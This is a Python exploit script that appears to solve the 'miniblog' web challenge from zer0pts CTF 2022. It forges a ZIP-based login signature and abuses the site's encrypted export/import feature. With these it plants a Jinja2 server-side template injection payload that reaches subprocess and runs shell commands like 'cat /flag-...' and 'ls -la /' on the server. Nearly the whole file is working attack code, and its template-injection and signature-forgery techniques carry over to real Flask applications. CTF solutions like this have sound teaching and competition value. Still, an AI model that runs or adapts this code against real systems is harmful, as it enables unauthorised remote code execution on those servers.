# zer0pts CTF 2022
# [web] miniblog#

import zipfile
import json
import io
import string
import random
import hashlib
import httpx
import base64
import subprocess
from Crypto.Cipher import AES

BASE_URL = "http://miniblog2.ctf.zer0pts.com:8018"
# BASE_URL = "http://127.0.0.1:5000"

# INJECTION = "{{''.__class__.__mro__[1].__subclasses__()[220]('ls -la /', shell=true, stdout=-1).communicate()}}"
INJECTION = "{{''.__class__.__mro__[1].__subclasses__()[220]('cat /flag-sadREGEXsad.txt', shell=true, stdout=-1).communicate()}}"

assert len(INJECTION) < 200


def to_snake(s):
    """Convert string to snake case"""
    for i, c in enumerate(s):
        if not c.isalnum():
            s = s[:i] + '_' + s[i+1:]
    return s


for _ in range(100):
    username = "".join(random.choice(string.ascii_letters) for _ in range(8))
    password = "".join(random.choice(string.ascii_letters) for _ in range(8))
    passhash = hashlib.md5(password.encode()).hexdigest()

    client = httpx.Client()
    res = client.post(
        f"{BASE_URL}/api/login",
        json={
            "username": username,
            "password": password,
        }
    )
    assert res.status_code == 200, res
    session = res.cookies["session"]

    # https://github.com/Paradoxis/Flask-Unsign
    workdir = json.loads(
        subprocess.run(
            ["flask-unsign", "--decode", "--cookie", session],
            capture_output=True,
            text=True
        ).stdout.replace("'", '"')
    )["workdir"]

    # content = ("x"*0xa0) + "{{''.__class__.__mro__[1].__subclasses__()}}"
    content = ("x"*(200 - len(INJECTION))) + INJECTION

    post = {
        "author": username,
        "title": "test",
        "content": content,
    }

    now = "2020/03/10 10:10:10"
    post_id = to_snake(post["title"])
    post_data = {
        'title': post["title"],
        'id': post_id,
        'date': now,
        'author': post["author"],
        'content': post["content"]
    }

    zip_buf = io.BytesIO()

    # uncompressed
    with zipfile.ZipFile(zip_buf, 'a', zipfile.ZIP_STORED) as zip:
        path = f'post/{workdir}/{post["title"]}.json'
        info = zipfile.ZipInfo(
            filename=path,
            date_time=(2000, 10, 5, 0, 0, 0),
        )
        info.external_attr = 0o444
        zip.writestr(info, json.dumps(post_data))
        zip.comment = f'SIGNATURE:{username}:{passhash}'.encode()
    zip_buf.seek(0)
    zip_body = zip_buf.read()
    try:
        evil_username = zip_body[:-len(f":{passhash}")].decode()
    except:
        continue

    evil_password = password
    evil_passhash = hashlib.md5(evil_password.encode()).hexdigest()
    evil_signature = f'SIGNATURE:{evil_username}:{evil_passhash}'.encode()

    # ref. https://docs.python.org/3/library/zipfile.html#zipfile.ZipFile.comment
    assert len(evil_signature) <= 65535

    # debug
    print(f"{username = }")
    print(f"{password = }")
    print(f"{passhash = }")

    evil_client = httpx.Client()
    res = evil_client.post(
        f"{BASE_URL}/api/login",
        json={
            "username": evil_username,
            "password": evil_password,
        },
    )
    assert res.status_code == 200, res

    res = evil_client.get(
        f"{BASE_URL}/api/export",
    )
    assert res.status_code == 200, res
    data = res.json()
    assert data["result"] == "OK", data

    tmp_zip_data = base64.b64decode(data["export"])

    res = client.post(
        f"{BASE_URL}/api/import",
        json={
            "import": base64.b64encode(tmp_zip_data[AES.block_size*2:]).decode()
        }
    )
    assert res.status_code == 200, res
    data = res.json()
    assert data["result"] == "OK", data

    res = client.get(
        f"{BASE_URL}/post/{post['title']}",
    )
    assert res.status_code == 200, res
    print(res.text)

    exit(0)


print("failed")
exit(1)
